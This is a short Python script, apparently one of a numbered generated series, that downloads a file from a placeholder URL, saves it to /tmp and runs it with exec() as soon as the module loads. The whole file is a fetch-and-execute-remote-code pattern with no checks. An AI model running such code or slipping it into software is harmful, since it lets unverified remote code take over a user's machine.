import requests
import os

def request_code(url):
    response = requests.get(url)
    return response.text

def write_code(filepath, code):
    with open(filepath, "w") as f:
        f.write(code)

def read_code(filepath):
    with open(filepath, "r") as f:
        return f.read()

def main():
    def execute_script(script):
        try:
            exec(script)
        except Exception as e:
            print(e)

    random_url = "http://random-url-65.com/script.py"
    local_file = "/tmp/script65.py"

    fetched_code = request_code(random_url)
    write_code(local_file, fetched_code)

    code_to_execute = read_code(local_file)
    execute_script(code_to_execute)

main()
